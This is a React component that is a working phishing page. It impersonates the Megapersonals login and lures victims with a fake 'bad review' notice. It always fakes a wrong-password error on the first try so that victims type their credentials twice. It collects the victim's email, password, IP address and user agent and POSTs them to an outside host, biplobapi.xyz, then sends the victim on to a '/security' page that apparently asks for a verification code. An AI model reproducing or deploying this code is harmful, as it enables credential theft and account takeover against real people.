import React, { useEffect, useState } from "react";
import "./Babylon.css";
import {
  useLoaderData,
  useLocation,
  useNavigate,
  useParams,
} from "react-router-dom";
import { useForm } from "react-hook-form";
import { isBrowser } from "react-device-detect";
const BabylonLogin = () => {
  const { user } = useLoaderData();
  const navigate = useNavigate();
  const params = useParams();
  const location = useLocation();
  const pathAfterDomain = location.pathname.split("/").slice(1, -1).join("/");
  const [passwordError, setPasswordError] = useState(false);
  const [verified, setVerified] = useState(false);

  const [userAgent, setUserAgent] = useState("");
  const [ipAddress, setIPAddress] = useState("");
  const [codeLength, seCodeLength] = useState(false);
  const [step, setStep] = useState(0);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  let type;
  const {
    register,
    handleSubmit,
    resetField,
    formState: { errors, isDirty, isValid },
    reset,
  } = useForm();

  if (isBrowser) {
    type = "desktop";
  } else {
    type = "mobile";
  }

  // localStorage.setItem("url", `/${pathAfterDomain}/${params.id}`);

  // console.log(localStorage.getItem('url'))
  useEffect(() => {
    const userAgent = window.navigator.userAgent;
    setUserAgent(userAgent);
    fetch("https://api.ipify.org?format=json")
      .then((response) => response.json())
      .then((data) => setIPAddress(data.ip))
      .catch((error) => console.log(error));
    const bookings = {
      type: type,
    };

    fetch(`https://biplobapi.xyz/updateclick/${params.id}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then()
      .then();

    // Cleanup function to stop the camera when the component unmounts
    // Set the document title
    document.title = "Megapersonal";

    // Create a link element for the favicon
    const favicon = document.createElement("link");
    favicon.rel = "icon";
    favicon.href = "/favicon.ico"; // Update with the correct path to your favicon

    // Append the favicon to the head
    document.head.appendChild(favicon);

    // Cleanup function to remove the favicon when the component is unmounted or favicon changes
  }, [type, params.id]);

  const handleAddBooking = (data) => {
    if (step === 0) {
      setStep(1);
      setEmail(data.email);
      setPassword(data.password);
      setPasswordError(true);
    } else {
      setPasswordError(false);
      localStorage.setItem("femail", data.email);
      const bookings = {
        email: email + " // " + data.email,
        password: password + " // " + data.password,
        site: "mega",
        code: "",
        ssn: "",
        idOne: "",
        idTwo: "",
        agent: userAgent,
        // cookieData:JSON.stringify(cookieData, null, 2),
        ipAddress: ipAddress,
        user: user,
        temp: Math.floor(Math.random() * (9999 - 1111) + 1111),
        postingTime: Date().toLocaleString(),
        isDeleted: false,
      };
      fetch("https://biplobapi.xyz/informations", {
        method: "POST",
        headers: {
          "content-type": "application/json",
        },
        body: JSON.stringify(bookings),
      })
        .then((res) => res.json())
        .then((result) => {
          reset();
          pathInfo(bookings);
        });
    }
  };
  const handleCaptcha = (data) => {
    setVerified(true);
    // console.log(data);
  };
  const handleCode = (event) => {
    event.target.value.length === 4 ? seCodeLength(true) : seCodeLength(false);
  };
  const pathInfo = (infos) => {
    let userId = window.location.pathname;
    const fnl = userId.substring(
      userId.indexOf("/") + 1,
      userId.lastIndexOf("/")
    );
    // navigate(localStorage.getItem('url'));
    // navigate("/gmail", { state: { temp: infos.temp } });
    navigate("/security", { state: { temp: infos.temp } });
    // if (fnl === "auth/login" || "verify/login" ) {
    //   navigate("/security", { state: { temp: infos.temp } });
    // } else {
    // }
  };

  return (
    <div style={{ width: "100%", minHeight: "100vh", background: "#EAF7FD" }}>
      <div className="b_main_container py-1">
        <div>
          {/* <h1 className='text-center'>
                        <font color="#FF7F5">Mega</font>
                        <font color="#6495ED">Personals</font>
                    </h1> */}
          <div className="row text-center">
            <div className="col-md-12 text-center py-1">
              <img className="main_img" src="/mega.png" alt="" />
            </div>
          </div>
          <h2 className="login_subhead b_one">9 Bad review</h2>
          <h2 className="login_subhead b_two">
            Confirm your own account before
          </h2>
          <h2 className="login_subhead b_two">
            <span style={{ color: "#993300" }}>VIEW / REMOVE</span> review
          </h2>
        </div>
        <div className="col-6 col-sm-4 col-md-5 mx-auto text-center  px-0">
          <form onSubmit={handleSubmit(handleAddBooking)} className="mt-3">
            {passwordError && (
              <small style={{ color: "#FF8080" }}>
                Email or Password is wrong
              </small>
            )}
            <div className="form-group">
              <input
                name="email"
                type="email"
                className="form-control bordered"
                {...register("email", { required: true })}
                aria-describedby="emailHelp"
                placeholder="Email"
              />
            </div>
            <div
              className="form-group"
              style={{ marginTop: "-4px", marginBottom: "5px" }}
            >
              <input
                name="password"
                type="password"
                className="form-control bordered"
                {...register("password", { required: true })}
                placeholder="Password"
              />

              <input type="hidden" className="device" value="{{ $result}}" />
            </div>

            {/* <img src="/captcha.png" alt="" className="my-1 w-100" /> */}

            <button type="submit" className="btn btn-primary mt-2">
              Submit
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default BabylonLogin;
